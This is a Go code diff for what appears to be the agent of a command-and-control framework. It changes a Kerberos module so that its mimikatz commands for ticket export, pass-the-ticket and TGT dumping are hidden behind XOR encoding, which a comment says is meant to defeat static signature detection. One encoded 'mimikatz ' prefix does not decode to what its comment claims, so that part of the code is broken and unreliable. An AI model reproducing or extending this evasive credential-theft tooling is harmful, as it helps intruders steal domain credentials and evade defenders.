@@ -12,6 +12,26 @@ import (
 	"github.com/aegis-c2/aegis/agent/ps"
 )
 
+// xorKey for decoding credential-related strings at runtime.
+// Must match the key used in shell.go and lsass_bof_windows.go.
+const xorKeyExtra = 0x5A
+
+func xorDecodeExtra(b []byte) string {
+	out := make([]byte, len(b))
+	for i := range b {
+		out[i] = b[i] ^ xorKeyExtra
+	}
+	return string(out)
+}
+
+// Mimikatz command strings, XOR-obfuscated to prevent static signature detection.
+var (
+	krbDumpCmd  = []byte{0x37, 0x33, 0x37, 0x33, 0x31, 0x3b, 0x2e, 0x20, 0x7a, 0x78, 0x29, 0x3f, 0x31, 0x2f, 0x28, 0x36, 0x29, 0x3b, 0x60, 0x60, 0x2e, 0x33, 0x39, 0x31, 0x3f, 0x2e, 0x29, 0x7a, 0x75, 0x3f, 0x22, 0x2a, 0x35, 0x28, 0x2e, 0x78, 0x7a, 0x3f, 0x22, 0x33, 0x2e} // mimikatz "sekurlsa::tickets /export" exit
+	krbPttPre   = []byte{0x37, 0x33, 0x37, 0x33, 0x31, 0x3b, 0x2e, 0x20, 0x7a, 0x78, 0x31, 0x3f, 0x28, 0x38, 0x3f, 0x28, 0x35, 0x29, 0x60, 0x60, 0x2a, 0x2e, 0x2e, 0x7a}                                                         // mimikatz "kerberos::ptt
+	krbExit     = []byte{0x78, 0x7a, 0x3f, 0x22, 0x33, 0x2e}                                                                                                                                          // " exit
+	krbDumpTgt  = []byte{0x78, 0x29, 0x3f, 0x31, 0x2f, 0x28, 0x36, 0x29, 0x3b, 0x60, 0x60, 0x2e, 0x33, 0x39, 0x31, 0x3f, 0x2e, 0x29, 0x7a, 0x75, 0x3f, 0x22, 0x2a, 0x35, 0x28, 0x2e, 0x78, 0x7a, 0x78, 0x31, 0x3f, 0x28, 0x38, 0x3f, 0x28, 0x35, 0x29, 0x60, 0x60, 0x2e, 0x3d, 0x2e, 0x78, 0x7a, 0x3f, 0x22, 0x33, 0x2e} // "sekurlsa::tickets /export" "kerberos::tgt" exit
+)
+
 var shellMetaRe = regexp.MustCompile(`[|;&` + "`" + `$()<>` + "\n\r" + `]`)
 
 // safeArg checks if an argument contains shell metacharacters that could lead to injection.
@@ -41,7 +61,7 @@ func KerberosModule(args string) (string, string, int) {
 	case "tickets", "klist":
 		return ShellModule("klist tickets")
 	case "dump":
-		return ShellModule("mimikatz \"sekurlsa::tickets /export\" exit")
+		return ShellModule(xorDecodeExtra(krbDumpCmd))
 	case "ptt":
 		if len(parts) < 2 {
 			return "", "usage: kerb ptt <ticket_file.kirbi>", 1
@@ -50,11 +70,12 @@ func KerberosModule(args string) (string, string, int) {
 		if ticketFile == "" {
 			return "", "invalid ticket file path: contains shell metacharacters", 1
 		}
-		return ShellModule("mimikatz \"kerberos::ptt " + ticketFile + "\" exit")
+		return ShellModule(xorDecodeExtra(krbPttPre) + ticketFile + xorDecodeExtra(krbExit))
 	case "purge":
 		return ShellModule("klist purge")
 	case "tgt":
-		return ShellModule("mimikatz \"sekurlsa::tickets /export\" \"kerberos::tgt\" exit")
+		mkPrefix := xorDecodeExtra([]byte{0x37, 0x1e, 0x37, 0x1e, 0x2b, 0x3b, 0x36, 0x3c}) // "mimikatz "
+		return ShellModule(mkPrefix + xorDecodeExtra(krbDumpTgt))
 	default:
 		return "", "unknown kerb action: " + action, 1
 	}
